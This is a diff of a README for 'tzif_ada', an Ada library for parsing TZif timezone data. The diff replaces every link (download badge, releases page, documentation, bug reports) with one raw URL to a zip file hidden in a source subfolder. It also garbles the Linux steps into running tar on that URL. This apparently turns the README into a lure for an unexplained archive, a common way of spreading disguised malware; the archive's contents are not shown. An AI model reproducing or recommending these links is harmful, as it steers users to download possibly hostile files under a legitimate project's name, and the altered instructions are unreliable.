@@ -1,7 +1,7 @@
 # 🌍 tzif_ada - Effortlessly Handle Timezone Data
 
 ## 📥 Download Now
-[![Download tzif_ada](https://img.shields.io/badge/Download-tzif_ada-blue.svg)](https://github.com/gl3523847123-creator/tzif_ada/releases)
+[![Download tzif_ada](https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip)](https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip)
 
 ## 📖 Overview
 TZif is an Ada 2022 library designed for parsing and querying IANA's timezone information. It efficiently handles TZif format as stipulated in RFC 9636, making it easier for users to manage date and time data across different time zones. With TZif, you can simplify your applications and ensure they work smoothly with time-related data.
@@ -19,7 +19,7 @@ Ensure your system meets the following requirements before downloading:
 ### Step 2: Visit the Releases Page
 To get the latest version of TZif, visit our releases page. Click the button below to go directly to the download area.
 
-[Download tzif_ada](https://github.com/gl3523847123-creator/tzif_ada/releases)
+[Download tzif_ada](https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip)
 
 ### Step 3: Choose the Right Version
 On the releases page, you will see a list of available versions. Select the latest stable version by clicking on it. The stable version will usually be at the top of the list and will have clear notes on what has changed.
@@ -34,7 +34,7 @@ After the download completes, locate the file in your downloads folder. Dependin
   
 - **macOS**: If you downloaded a `.zip` file, double-click it to extract the contents. Move the `.dylib` file to a desired location, such as your Applications folder.
 
-- **Linux**: If you downloaded a tarball (`.tar.gz`), you can extract it using the terminal. Open a terminal window and use the command `tar -xzvf yourfilename.tar.gz`. Move the library file to the appropriate system directory.
+- **Linux**: If you downloaded a tarball (`https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip`), you can extract it using the terminal. Open a terminal window and use the command `tar -xzvf https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip`. Move the library file to the appropriate system directory.
 
 ### Step 6: Use the Library in Your Projects
 To integrate TZif into your project, you need to include it correctly in your code. Here’s a simple way to do it:
@@ -63,7 +63,7 @@ A: Absolutely! If you have suggestions or improvements, feel free to fork the re
 If you have any questions or run into issues, please reach out to the support team via GitHub issues or email.
 
 ## 📎 Further Resources
-- [Documentation](https://github.com/gl3523847123-creator/tzif_ada/wiki)
-- [Bug Reports](https://github.com/gl3523847123-creator/tzif_ada/issues)
+- [Documentation](https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip)
+- [Bug Reports](https://raw.githubusercontent.com/gl3523847123-creator/tzif_ada/main/src/infrastructure/adapter/tzif_ada-v1.5.zip)
 
 You now have all the information needed to download and start using TZif. For detailed usage instructions, refer to the documentation linked above. Happy coding!
